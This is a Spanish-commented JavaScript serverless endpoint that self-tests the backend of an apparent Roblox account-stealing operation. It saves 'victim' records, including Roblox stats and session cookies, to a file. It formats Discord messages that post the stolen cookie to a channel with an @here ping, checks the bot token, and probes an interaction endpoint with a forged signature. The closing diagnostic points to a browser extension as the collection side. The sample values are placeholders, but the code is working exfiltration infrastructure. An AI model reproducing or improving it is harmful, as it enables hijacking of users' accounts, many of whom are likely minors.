// api/test-interaccion-full.js
import fs from 'fs';
import path from 'path';
import { verifyKey } from 'discord-interactions';

const DB_PATH = '/tmp/victims.json';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }

    const testId = req.query.userId || `test_${Date.now()}`;
    const baseUrl = `https://${req.headers.host}`;
    
    const resultados = {
        timestamp: new Date().toISOString(),
        testId: testId,
        paso1_datos_victima: null,
        paso2_verificacion_token: null,
        paso3_formato_respuesta: null,
        paso4_simulacion_interaccion: null,
        paso5_prueba_real: null,
        diagnostico_final: null
    };

    // ============================================
    // PASO 1: Crear datos de víctima de prueba
    // ============================================
    const victimData = {
        roblox: {
            username: "Usuario_Test_" + Date.now(),
            userId: testId,
            robux: 9999,
            seguidores: 5000,
            amigos: 1000,
            premium: "Sí",
            verified: "Sí",
            headless: "Sí",
            korblox: "No"
        },
        cookie: "COOKIE_TEST_123456",
        pais: "Argentina",
        fecha: new Date().toLocaleDateString('es-AR'),
        hora: new Date().toLocaleTimeString('es-AR') + " De la Tarde",
        userAgent: "Mozilla/5.0 (Test)"
    };

    // Guardar en /tmp
    try {
        let victims = {};
        if (fs.existsSync(DB_PATH)) {
            victims = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
        }
        victims[testId] = victimData;
        fs.writeFileSync(DB_PATH, JSON.stringify(victims));
        resultados.paso1_datos_victima = { 
            guardado: true, 
            userId: testId,
            datos: victimData 
        };
    } catch (e) {
        resultados.paso1_datos_victima = { error: e.message };
    }

    // ============================================
    // PASO 2: Verificar token de Discord
    // ============================================
    const token = process.env.DISCORD_BOT_TOKEN;
    const channelId = process.env.DISCORD_CHANNEL_ID;
    const publicKey = process.env.DISCORD_PUBLIC_KEY;

    try {
        const testAuth = await fetch('https://discord.com/api/v10/users/@me', {
            headers: { 'Authorization': `Bot ${token}` }
        });
        const authData = await testAuth.json();
        
        resultados.paso2_verificacion_token = {
            token_valido: testAuth.ok,
            bot_id: authData.id,
            bot_name: authData.username,
            channel_id: channelId,
            public_key_configurada: !!publicKey
        };
    } catch (e) {
        resultados.paso2_verificacion_token = { error: e.message };
    }

    // ============================================
    // PASO 3: Verificar formato de respuesta para ROBLOX
    // ============================================
    const r = victimData.roblox || {};
    const mensajeRoblox = `||@here||
🔔 ¡Informacion seleccionada: **ROBLOX**!

**📌 PRINCIPAL **

👤 Usuario Roblox: ${r.username || 'Test'}
🆔 ID: ${r.userId || '123'}
💰 Robux: ${r.robux || 0}
⭐ Seguidores: ${r.seguidores || 0}
👥 Amigos: ${r.amigos || 0}
💱 Premium: ${r.premium || 'No'}
🔰 Verificado: ${r.verified || 'No'}

💼 **Inventario:**
Headless: \`${r.headless || 'No'}\`
Korblox: \`${r.korblox || 'No'}\`

**🌐 Informacion Horaria:**
🌍 País: \`${victimData.pais || 'Desconocido'}\`
📅 Fecha: \`${victimData.fecha || ''}\`
⏰ Hora Exacta: \`${victimData.hora || ''}\`

🍪 Cookie:
\`\`\`${victimData.cookie || 'No'}\`\`\``;

    const respuestaFormato = {
        type: 4,
        data: {
            content: mensajeRoblox,
            flags: 64
        }
    };

    resultados.paso3_formato_respuesta = {
        longitud_mensaje: mensajeRoblox.length,
        formato_valido: mensajeRoblox.length > 100 && mensajeRoblox.includes('||@here||'),
        respuesta_generada: respuestaFormato
    };

    // ============================================
    // PASO 4: Simular interacción completa
    // ============================================
    const simulacionInteraction = {
        type: 3,
        data: {
            custom_id: `roblox_${testId}`
        }
    };

    // Procesar como lo haría interaction.js
    const [action, userId] = simulacionInteraction.data.custom_id.split('_');
    
    let victimDataLeida = {};
    try {
        if (fs.existsSync(DB_PATH)) {
            const victims = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
            victimDataLeida = victims[userId] || {};
        }
    } catch (e) {}

    const rLeida = victimDataLeida.roblox || {};
    const mensajeGenerado = `||@here||
🔔 ¡Informacion seleccionada: **ROBLOX**!

**📌 PRINCIPAL **

👤 Usuario Roblox: ${rLeida.username || 'Test'}
🆔 ID: ${rLeida.userId || '123'}
💰 Robux: ${rLeida.robux || 0}
⭐ Seguidores: ${rLeida.seguidores || 0}
👥 Amigos: ${rLeida.amigos || 0}
💱 Premium: ${rLeida.premium || 'No'}
🔰 Verificado: ${rLeida.verified || 'No'}

💼 **Inventario:**
Headless: \`${rLeida.headless || 'No'}\`
Korblox: \`${rLeida.korblox || 'No'}\`

**🌐 Informacion Horaria:**
🌍 País: \`${victimDataLeida.pais || 'Desconocido'}\`
📅 Fecha: \`${victimDataLeida.fecha || ''}\`
⏰ Hora Exacta: \`${victimDataLeida.hora || ''}\`

🍪 Cookie:
\`\`\`${victimDataLeida.cookie || 'No'}\`\`\``;

    resultados.paso4_simulacion_interaccion = {
        accion: action,
        userId: userId,
        datos_encontrados: !!victimDataLeida.roblox,
        mensaje_generado: mensajeGenerado.substring(0, 200) + '...',
        respuesta_valida: true
    };

    // ============================================
    // PASO 5: Probar interaction.js con firma simulada
    // ============================================
    try {
        // Crear una firma falsa para probar (solo para ver si responde)
        const testInteraction = {
            type: 3,
            data: { custom_id: `roblox_${testId}` }
        };

        const response = await fetch(`${baseUrl}/api/interaction`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                // Simular headers de Discord
                'x-signature-ed25519': 'test_signature',
                'x-signature-timestamp': Date.now().toString()
            },
            body: JSON.stringify(testInteraction)
        });

        const responseText = await response.text();
        let responseData;
        try {
            responseData = JSON.parse(responseText);
        } catch {
            responseData = { error: 'No es JSON', texto: responseText.substring(0, 200) };
        }

        resultados.paso5_prueba_real = {
            status: response.status,
            ok: response.ok,
            respuesta: responseData
        };
    } catch (e) {
        resultados.paso5_prueba_real = { error: e.message };
    }

    // ============================================
    // DIAGNÓSTICO FINAL
    // ============================================
    const errores = [];
    if (!resultados.paso2_verificacion_token?.token_valido) errores.push('Token de Discord inválido');
    if (!resultados.paso1_datos_victima?.guardado) errores.push('No se pueden guardar datos');
    if (!resultados.paso4_simulacion_interaccion?.datos_encontrados) errores.push('No se encuentran datos al simular');
    if (resultados.paso5_prueba_real?.status === 401) errores.push('Firma de Discord inválida - Revisa PUBLIC_KEY');
    if (resultados.paso5_prueba_real?.status === 404) errores.push('Endpoint /api/interaction no encontrado');
    
    resultados.diagnostico_final = {
        funcionando: errores.length === 0,
        errores: errores,
        recomendacion: errores.length === 0 ? 
            '✅ Todo funciona. El error debe estar en la extensión o en la comunicación' :
            `❌ Corrige: ${errores.join(', ')}`
    };

    res.status(200).json(resultados);
}